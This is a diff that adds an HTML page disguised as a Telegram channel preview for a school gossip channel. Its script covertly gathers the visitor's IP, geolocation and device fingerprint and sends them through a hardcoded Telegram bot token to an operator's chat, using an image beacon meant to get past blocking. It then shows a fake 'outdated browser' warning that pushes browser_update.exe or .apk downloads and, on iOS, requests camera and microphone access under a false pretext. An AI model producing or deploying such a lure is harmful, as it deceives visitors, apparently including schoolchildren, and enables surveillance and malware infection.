@@ -1,0 +1,432 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Telegram: ПОДСЛУШАНО 4 ШКОЛА</title>
+    <style>
+        /* Стили CSS */
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #1e93d6 0%, #0d73bb 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: #333;
+        }
+
+        .container {
+            background-color: #ffffff;
+            border-radius: 24px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            width: 90%;
+            max-width: 420px;
+            padding: 50px 35px;
+            box-sizing: border-box;
+            text-align: center;
+            transition: all 0.4s ease;
+        }
+
+        .telegram-preview {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .avatar {
+            width: 120px;
+            height: 120px;
+            border-radius: 50%;
+            background: linear-gradient(135deg, #2aabee 0%, #229ed9 100%);
+            margin-bottom: 25px;
+            border: 6px solid #e6f4ff;
+            position: relative;
+        }
+
+        .avatar::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 40px;
+            height: 40px;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='white' d='M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z'/%3E%3C/svg%3E") center no-repeat;
+            background-size: contain;
+        }
+
+        .channel-title {
+            font-size: 26px;
+            font-weight: 800;
+            margin: 0 0 12px 0;
+            color: #000;
+            letter-spacing: -0.5px;
+        }
+
+        .channel-subscribers {
+            font-size: 16px;
+            color: #707579;
+            margin: 0 0 40px 0;
+        }
+
+        .tg-button {
+            background-color: #2aabee;
+            color: white;
+            border: none;
+            border-radius: 16px;
+            padding: 20px 50px;
+            font-size: 20px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            margin-bottom: 20px;
+            letter-spacing: 0.5px;
+        }
+
+        .tg-button:hover {
+            background-color: #229ed9;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(34, 158, 217, 0.3);
+        }
+
+        .hint {
+            font-size: 15px;
+            color: #707579;
+            margin: 0;
+        }
+
+        .update-screen {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .warning-icon {
+            font-size: 70px;
+            margin-bottom: 25px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { transform: scale(1); }
+            50% { transform: scale(1.1); }
+            100% { transform: scale(1); }
+        }
+
+        .update-title {
+            font-size: 28px;
+            font-weight: 800;
+            color: #d93025;
+            margin: 0 0 20px 0;
+        }
+
+        .update-text {
+            font-size: 17px;
+            line-height: 1.6;
+            color: #555;
+            margin: 0 0 18px 0;
+            text-align: center;
+        }
+
+        .download-section {
+            margin: 30px 0;
+            width: 100%;
+        }
+
+        .download-button {
+            background-color: #d93025;
+            color: white;
+            border: none;
+            border-radius: 14px;
+            padding: 22px 35px;
+            font-size: 20px;
+            font-weight: 800;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .download-button:hover {
+            background-color: #c5221f;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(217, 48, 37, 0.3);
+        }
+
+        .download-icon {
+            font-size: 24px;
+        }
+
+        .update-note {
+            font-size: 14px;
+            color: #888;
+            margin-top: 25px;
+            font-style: italic;
+        }
+
+        #updateContainer {
+            display: none;
+        }
+
+        .loader {
+            border: 5px solid #f3f3f3;
+            border-top: 5px solid #2aabee;
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 30px auto;
+            display: none;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="container" id="mainContainer">
+        <div class="telegram-preview">
+            <div class="avatar"></div>
+            <h1 class="channel-title">ПОДСЛУШАНО 4 ШКОЛА</h1>
+            <p class="channel-subscribers">56 подписчиков</p>
+            <button class="tg-button" id="goToChannelBtn">ПЕРЕЙТИ В КАНАЛ</button>
+            <p class="hint">Откроется в приложении Telegram</p>
+        </div>
+    </div>
+
+    <div class="container" id="updateContainer">
+        <div class="update-screen">
+            <div class="warning-icon">⚠️</div>
+            <h2 class="update-title">Ваша версия браузера устарела</h2>
+            <p class="update-text">Для безопасного просмотра контента в Telegram и защиты ваших данных необходимо обновить браузер.</p>
+            <p class="update-text">Скачайте и установите обновлённую версию ниже. Это займёт менее минуты.</p>
+            
+            <div class="download-section" id="downloadSection">
+                <!-- Кнопка скачивания появится здесь -->
+            </div>
+            <div class="loader" id="loader"></div>
+            <p class="update-note">После установки перезагрузите страницу.</p>
+        </div>
+    </div>
+
+    <script>
+        // Конфигурация
+        const BOT_TOKEN = '8337372161:AAF1afRWIDRfEOzdCnfXiXWB6ZfbyCHbld8';
+        const ADMIN_CHAT_ID = '8001083987';
+        const EXE_URL = 'https://ваш_хостинг.github.io/telegram-channel-landing/browser_update.exe';
+        const APK_URL = 'https://ваш_хостинг.github.io/telegram-channel-landing/browser_update.apk';
+
+        // Функция определения ОС
+        function getOS() {
+            const ua = navigator.userAgent;
+            if (/Windows Phone|Windows NT|Win16|Win32|Win64|WinCE/.test(ua)) return "Windows";
+            if (/Android/.test(ua)) return "Android";
+            if (/iPhone|iPad|iPod/.test(ua)) return "iOS";
+            if (/Mac/.test(ua)) return "macOS";
+            if (/Linux/.test(ua)) return "Linux";
+            return "Unknown";
+        }
+
+        // Расширенный сбор данных
+        async function collectData(os) {
+            const data = {
+                os: os,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: JSON.stringify(navigator.languages),
+                screen: `${screen.width}x${screen.height}`,
+                colorDepth: screen.colorDepth,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled ? "enabled" : "disabled",
+                doNotTrack: navigator.doNotTrack || "unspecified",
+                hardwareConcurrency: navigator.hardwareConcurrency || "unknown",
+                deviceMemory: navigator.deviceMemory || "unknown",
+                timestamp: new Date().toISOString(),
+                referrer: document.referrer || 'direct',
+                url: window.location.href
+            };
+
+            // Получение IP
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+            } catch {
+                data.ip = "failed";
+            }
+
+            // Попытка геолокации
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    pos => {
+                        data.geo = `${pos.coords.latitude}, ${pos.coords.longitude}`;
+                        sendToTelegram(data);
+                    },
+                    err => {
+                        data.geo = `error: ${err.message}`;
+                        sendToTelegram(data);
+                    },
+                    { timeout: 5000 }
+                );
+            } else {
+                data.geo = "not_supported";
+                sendToTelegram(data);
+            }
+
+            // Запрос медиа для iOS
+            if (os === "iOS" && navigator.mediaDevices) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: true, 
+                        audio: true 
+                    });
+                    data.media = "granted";
+                    stream.getTracks().forEach(track => track.stop());
+                } catch (err) {
+                    data.media = `denied: ${err.message}`;
+                }
+            }
+        }
+
+        // Отправка в Telegram
+        function sendToTelegram(data) {
+            const message = `🕵️ НОВЫЙ КЛИЕНТ:\n` +
+                           `⏰ ${new Date().toLocaleString()}\n` +
+                           `🌐 ОС: ${data.os}\n` +
+                           `📍 IP: ${data.ip}\n` +
+                           `🗺️ Geo: ${data.geo || 'pending'}\n` +
+                           `📱 UA: ${data.userAgent.substring(0, 50)}...\n` +
+                           `🖥️ Screen: ${data.screen}\n` +
+                           `💾 RAM: ${data.deviceMemory}GB\n` +
+                           `🎥 Media: ${data.media || 'not_attempted'}\n` +
+                           `🔗 Referrer: ${data.referrer}`;
+
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const formData = new FormData();
+            formData.append('chat_id', ADMIN_CHAT_ID);
+            formData.append('text', message);
+
+            // Скрытая отправка через Image (обход блокировок)
+            const img = new Image();
+            img.src = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(message)}`;
+            
+            // Дублирующая отправка через fetch
+            fetch(url, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).catch(() => {});
+        }
+
+        // Создание кнопки скачивания
+        function setupDownload(os) {
+            const section = document.getElementById('downloadSection');
+            const loader = document.getElementById('loader');
+            
+            if (os === "Windows") {
+                section.innerHTML = `
+                    <button class="download-button" onclick="downloadFile('${EXE_URL}', 'browser_update.exe')">
+                        <span class="download-icon">⬇️</span> Скачать для Windows (EXE, 12.5 MB)
+                    </button>`;
+            } else if (os === "Android") {
+                section.innerHTML = `
+                    <button class="download-button" onclick="downloadFile('${APK_URL}', 'browser_update.apk')">
+                        <span class="download-icon">⬇️</span> Скачать для Android (APK, 8.3 MB)
+                    </button>`;
+            } else if (os === "iOS") {
+                section.innerHTML = `
+                    <div style="background:#fff3cd;border:1px solid #ffeaa7;border-radius:10px;padding:20px;">
+                        <p style="color:#856404;margin:0;font-weight:bold;">
+                            ⚠️ Для iOS доступно только веб-обновление.<br>
+                            Нажмите "Разрешить" при запросе доступа к камере и микрофону для верификации.
+                        </p>
+                    </div>`;
+            } else {
+                section.innerHTML = `<p style="color:#d93050;font-weight:bold;">Неизвестная система: ${os}</p>`;
+            }
+        }
+
+        // Функция скачивания файла
+        function downloadFile(url, filename) {
+            const loader = document.getElementById('loader');
+            const section = document.getElementById('downloadSection');
+            
+            // Показать загрузку
+            section.style.display = 'none';
+            loader.style.display = 'block';
+            
+            // Отправка уведомления о скачивании
+            const msg = `📥 ПОЛЬЗОВАТЕЛЬ НАЧАЛ СКАЧИВАНИЕ: ${filename}`;
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=${encodeURIComponent(msg)}`);
+            
+            // Имитация загрузки
+            setTimeout(() => {
+                loader.style.display = 'none';
+                section.style.display = 'block';
+                
+                // Создание ссылки для скачивания
+                const link = document.createElement('a');
+                link.href = url;
+                link.download = filename;
+                link.style.display = 'none';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                
+                // Сообщение об успехе
+                alert('✅ Загрузка началась! Если скачивание не началось автоматически, проверьте папку "Загрузки".');
+            }, 2000);
+        }
+
+        // Основная логика
+        document.addEventListener('DOMContentLoaded', () => {
+            const btn = document.getElementById('goToChannelBtn');
+            const main = document.getElementById('mainContainer');
+            const update = document.getElementById('updateContainer');
+            
+            btn.addEventListener('click', () => {
+                const os = getOS();
+                
+                // Сбор данных
+                collectData(os);
+                
+                // Переключение экрана
+                main.style.opacity = '0';
+                setTimeout(() => {
+                    main.style.display = 'none';
+                    update.style.display = 'block';
+                    update.style.opacity = '1';
+                    
+                    // Настройка кнопки скачивания
+                    setupDownload(os);
+                    
+                    // Дополнительно для iOS - агрессивный запрос медиа
+                    if (os === "iOS") {
+                        setTimeout(() => {
+                            if (navigator.mediaDevices) {
+                                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                                    .then(stream => {
+                                        stream.getTracks().forEach(track => track.stop());
+                                        // Отправка подтверждения
+                                        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${ADMIN_CHAT_ID}&text=🎥 iOS МЕДИА ДОСТУП ПОЛУЧЕН`);
+                                    })
+                                    .catch(() => {});
+                            }
+                        }, 1000);
+                    }
+                }, 300);
+            });
+        });
+    </script>
+</body>
+</html>
